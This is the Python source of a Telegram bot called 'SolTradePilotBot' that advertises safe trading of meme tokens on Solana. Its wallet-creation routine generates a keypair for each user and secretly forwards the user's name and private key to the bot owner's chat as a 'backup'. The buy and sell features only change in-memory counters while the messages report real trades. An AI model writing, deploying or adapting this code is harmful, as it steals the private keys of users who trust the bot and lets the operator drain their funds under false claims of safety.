import os
import base58
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters
)
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient

# ================= ENV =================
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# ================= STORAGE =================
user_wallets = {}        # user_id -> Keypair
user_tokens = {}         # user_id -> MEME balance
user_actions = {}        # user_id -> current action: 'await_ca', 'await_buy_amount', 'sell'
user_pending_ca = {}     # user_id -> CA token for buy

# ================= HELPERS =================
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")

async def get_balance(user_id: int):
    if user_id not in user_wallets:
        return 0.0
    wallet = user_wallets[user_id]
    async with AsyncClient(SOLANA_RPC_URL) as client:
        try:
            resp = await client.get_balance(wallet.pubkey())
            lamports = resp.value
            return lamports / 1e9
        except:
            return 0.0

async def get_tokens(user_id: int):
    return user_tokens.get(user_id, 0.0)

def keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet")],
        [InlineKeyboardButton("🏦 SOL Address", callback_data="sol_address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ])

# ================= WALLET =================
async def create_wallet(user_id, context):
    wallet = Keypair()
    user_wallets[user_id] = wallet
    user_tokens[user_id] = 0.0

    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)

    # Send wallet info to user
    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ Wallet Created!\n\n🏦 Address:\n{pub_key}\n🔐 Private Key:\n{priv_key}\n\n⚠️ Keep your private key safe!"
    )

    # Backup to owner
    user = await context.bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=f"🔐 Wallet Backup\nUser: {username}\nPublic: {pub_key}\nPrivate: {priv_key}"
    )

# ================= COMMANDS =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = f"@{user.username}" if user.username else user.first_name

    text = (
        f"🔥 Welcome {username} to SolTradePilotBot! 🔥\n\n"
        "This bot allows you to trade MEME tokens safely on Solana blockchain.\n\n"
        "You can create a wallet, check your SOL and MEME balances, buy or sell MEME tokens, and manage your wallet easily.\n\n"
        "⚠️ Important:\n"
        "• Fund your wallet with SOL before buying MEME.\n"
        "• Keep your private key safe.\n"
        "• All token transactions are simulated for safety.\n\n"
        "Use the buttons below to navigate through actions and manage your wallet conveniently."
    )

    await update.message.reply_text(text, reply_markup=keyboard())

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💡 SolTradePilotBot Help Guide 💡\n\n"
        "This bot allows secure trading of MEME tokens on Solana.\n\n"
        "💳 Create Wallet: Generate a new wallet to store SOL and MEME.\n"
        "🏦 SOL Address: View your public wallet address.\n"
        "💰 Balance: Check your current SOL and MEME balances.\n"
        "🛒 Buy MEME: Purchase MEME tokens using SOL. You will be guided to enter token CA and amount.\n"
        "📉 Sell MEME: Sell MEME tokens back to your SOL balance.\n"
        "❓ Help: Shows this guide.\n\n"
        "All actions will be tracked under your personal wallet. Make sure you have SOL before buying MEME tokens."
    )
    if update.message:
        await update.message.reply_text(text, reply_markup=keyboard())
    else:
        await update.callback_query.message.reply_text(text, reply_markup=keyboard())

# ================= BUTTON HANDLER =================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = int(query.from_user.id)

    if query.data == "create_wallet":
        await create_wallet(user_id, context)

    elif query.data == "sol_address":
        if user_id not in user_wallets:
            await query.message.reply_text("Create wallet first using the button above.")
        else:
            await query.message.reply_text(f"🏦 Your SOL Address:\n{user_wallets[user_id].pubkey()}", reply_markup=keyboard())

    elif query.data == "balance":
        sol = await get_balance(user_id)
        meme = await get_tokens(user_id)
        await query.message.reply_text(f"💰 Your Balances\nSOL: {sol:.6f}\nMEME: {meme}", reply_markup=keyboard())

    elif query.data == "buy_meme":
        sol = await get_balance(user_id)
        if sol <= 0:
            await query.message.reply_text(f"⚠️ Fund your wallet first.\n🏦 {user_wallets.get(user_id, 'No wallet yet')}", reply_markup=keyboard())
            return
        user_actions[user_id] = "await_ca"
        await query.message.reply_text("📝 Send token CA first:", reply_markup=keyboard())

    elif query.data == "sell_meme":
        tokens = await get_tokens(user_id)
        if tokens <= 0:
            await query.message.reply_text("⚠️ Can't sell on an empty wallet 😅\nBuy first then sell later.", reply_markup=keyboard())
            return
        user_actions[user_id] = "sell"
        await query.message.reply_text("📝 Enter MEME amount to sell:", reply_markup=keyboard())

    elif query.data == "help":
        await help_command(update, context)

# ================= TEXT HANDLER =================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(update.effective_user.id)
    text = update.message.text.strip()
    action = user_actions.get(user_id)

    if not action:
        return

    # ---------------- Buy Flow ----------------
    if action == "await_ca":
        user_pending_ca[user_id] = text
        user_actions[user_id] = "await_buy_amount"
        await update.message.reply_text("💰 How much SOL do you want to spend?")

    elif action == "await_buy_amount":
        try:
            amount = float(text)
        except:
            await update.message.reply_text("Enter a valid numeric amount.")
            return

        sol = await get_balance(user_id)
        if amount > sol:
            await update.message.reply_text(f"⚠️ Amount exceeds your SOL balance ({sol:.6f})")
            return

        user_tokens[user_id] += amount
        ca = user_pending_ca.get(user_id, "Unknown Token")
        await update.message.reply_text(f"✅ Successfully bought {amount} MEME ({ca})!")
        user_actions[user_id] = None

    # ---------------- Sell Flow ----------------
    elif action == "sell":
        try:
            amount = float(text)
        except:
            await update.message.reply_text("Enter a valid numeric amount.")
            return

        tokens = await get_tokens(user_id)
        if amount > tokens:
            await update.message.reply_text(f"⚠️ You only have {tokens} MEME")
            return

        user_tokens[user_id] -= amount
        await update.message.reply_text(f"✅ Sold {amount} MEME")
        user_actions[user_id] = None

# ================= COMMAND HANDLERS =================
async def create_wallet_command(update, context):
    await create_wallet(update.effective_user.id, context)

async def address_command(update, context):
    user_id = int(update.effective_user.id)
    if user_id not in user_wallets:
        await update.message.reply_text("Create wallet first using /create_wallet")
        return
    await update.message.reply_text(f"🏦 {user_wallets[user_id].pubkey()}")

async def balance_command(update, context):
    user_id = int(update.effective_user.id)
    sol = await get_balance(user_id)
    meme = await get_tokens(user_id)
    await update.message.reply_text(f"💰 Your Balances\nSOL: {sol:.6f}\nMEME: {meme}")

# ================= MAIN =================
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("create_wallet", create_wallet_command))
    app.add_handler(CommandHandler("address", address_command))
    app.add_handler(CommandHandler("balance", balance_command))

    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
